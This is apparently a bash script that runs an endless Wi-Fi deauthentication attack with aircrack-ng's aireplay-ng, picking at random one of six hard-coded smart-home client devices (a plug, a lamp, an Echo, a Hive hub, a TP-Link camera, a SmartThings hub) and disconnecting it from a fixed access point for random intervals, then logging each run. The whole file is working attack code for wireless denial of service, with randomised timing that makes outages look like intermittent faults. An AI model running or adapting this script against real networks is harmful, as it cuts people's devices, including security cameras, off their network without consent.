#!/bin/bash

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
printf "\n$current_time *!*!*!*!*!*!*!*!* STARTING DEAUTH SCRIPT (ON ALL - even if not discoverable) \n" 2>&1 | tee -a deauth_output/deauthALL_log.txt

i=0

while true
do
    i=$((i+1))

    x1="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c 50:c7:bf:66:99:2e wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    x2="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c D0:73:D5:21:82:61 wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    x3="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c 68:37:e9:66:a1:1e wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    x4="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c 00:1c:2b:0a:e3:de wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    x5="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c 60:e3:27:25:a1:8d wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    x6="sudo aireplay-ng --deauth 0 -a F0:9F:C2:74:28:98 -c d0:52:a8:91:0a:0a wlan0mon 2>&1 |tee -a deauth_output/deauthALL.log_terminal.txt"
    
    x_current=""

    x1_name="plug"
    x2_name="lamp"
    x3_name="echo"
    x4_name="hive" #adjust
    x5_name="tplink camera" #adjust
    x6_name="smart things" #adjust

    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n\n * $start_current_time STARTING iteration $i : "
    rand=$(shuf -i1-6 -n1)
    Random_Time=$(shuf -i5-600 -n1) #from 5 sec to 10 minutes

    if [ "$rand" = "1" ]; then
        printf "deauth on $x1_name for $Random_Time seconds \n"
	printf $(eval $x1) & script1=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script1
        x_current="$x1_name"

    elif [ "$rand" = "2" ]; then
        printf "deauth on $x2_name for $Random_Time seconds\n"
	printf $(eval $x2) & script2=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script2
        x_current="$x2_name"

    elif [ "$rand" = "3" ]; then
        printf "deauth on $x3_name for $Random_Time seconds\n"
	printf $(eval $x3) & script3=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script3
        x_current="$x3_name"

    elif [ "$rand" = "4" ]; then
        printf "deauth on $x4_name for $Random_Time seconds\n"
	printf $(eval $x4) & script4=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script4
        x_current="$x4_name"

    elif [ "$rand" = "5" ]; then
        printf "deauth on $x5_name for $Random_Time seconds\n"
	printf $(eval $x5) & script5=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script5
        x_current="$x5_name"

    elif [ "$rand" = "6" ]; then
        printf "deauth on $x6_name for $Random_Time seconds\n"
	printf $(eval $x6) & script6=$!
        printf "\n\n"
        sleep $Random_Time
        kill $script6
        x_current="$x6_name"

    else
        echo "error"
    fi

    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "$i) Deauth on a $x_current start: $start_current_time, finish: $stop_current_time\n" 2>&1 | tee -a deauth_output/deauth_log.txt

    Random_Sleep=$(shuf -i5-200 -n1) #from 5 sec to 5 minutes
    printf "\n\n sleeping for $Random_Sleep seconds\n" 2>&1 | tee -a deauth_output/deauthALL_log.txt
    sleep $Random_Sleep

    

done



